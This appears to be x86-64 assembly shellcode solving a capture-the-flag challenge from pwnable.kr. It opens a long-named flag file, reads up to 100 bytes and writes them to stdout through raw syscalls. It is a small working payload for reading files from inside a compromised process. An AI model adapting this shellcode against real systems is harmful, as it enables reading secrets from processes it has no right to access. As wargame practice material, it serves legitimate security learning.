; read flag and print to screen
section .text
global _start


_start:
    xor rax, rax
    ; PIE
    ; calculate flag    
    lea r12, [rel flag]
    ; reset rax
    xor rax, rax
    ; call open
    mov eax, 2
    mov rdi, r12
    mov rsi, 0
    mov rdx, 0
    syscall
    ; store fd in r15
    mov r15, rax
    ; call read
    xor rax, rax
    mov rdi, r15
    ; calculate zerobuf
    lea r11, [rel zerobuf]
    mov rsi, r11
    mov rdx, 100
    syscall
    ; store bytes read into r14
    mov r14, rax
    ; write to screen
    xor rax, rax
    mov eax, 1
    mov rdi, 1 ; stdout
    lea r11, [rel zerobuf]
    mov rsi, r11
    mov rdx, 100
    syscall
    nop
    ; done


zerobuf:
    times 100 db 0
flag:
    db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0x00
end:
    db 'MARKER', 0x00


